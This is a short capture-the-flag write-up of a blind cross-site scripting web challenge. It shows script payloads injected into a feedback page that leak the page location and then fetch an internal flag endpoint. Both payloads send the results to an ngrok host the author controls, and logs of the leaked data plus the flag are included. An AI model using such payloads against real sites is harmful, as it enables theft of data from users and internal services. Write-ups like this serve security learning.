# bxss

**Date:** 09, June, 2021

**Author:** Dhilip Sanjay S

**Category:** Web

---

- The `feedback` page in the website was accepting html tags as input.
- If there was url in the input, like inside `<img>` and `<script>` tags, the server was making request to that URL.

## Using ngrok

- Using ngrok, I tried to fetch the `document.cookie` at first.
- But there was no cookie. (May be the cookie had `HttpOnly flag`)
- Then found the `document.loction` using the same:

```js
<script>document.location='http://1659bf86e1d6.ngrok.io?c='+document.location</script>
```

- There was a **secret admin cookie panel** at `http://0.0.0.0:8080`:

```bash
127.0.0.1 - - [09/Jun/2021 15:28:46] "GET /?c=http://0.0.0.0:8080/Secret_admin_cookie_panel HTTP/1.1" 200 -
```

## Fetching flag

- By using `fetch` API in javascript, the flag can be fetched from `http://0.0.0.0:8080/flag`
- And then the response can be sent to `ngrok`:

```js
<script>
fetch("http://127.0.0.1:8080/flag").then(r=>r.text()).then((r)=>{location="http://1659bf86e1d6.ngrok.io/?c="+r})
</script>
```

- The request had the flag:

```
127.0.0.1 - - [05/Jun/2021 00:52:46] "GET /?c=zh3r0{{Ea5y_bx55_ri8}} HTTP/1.1" 200 -
```

---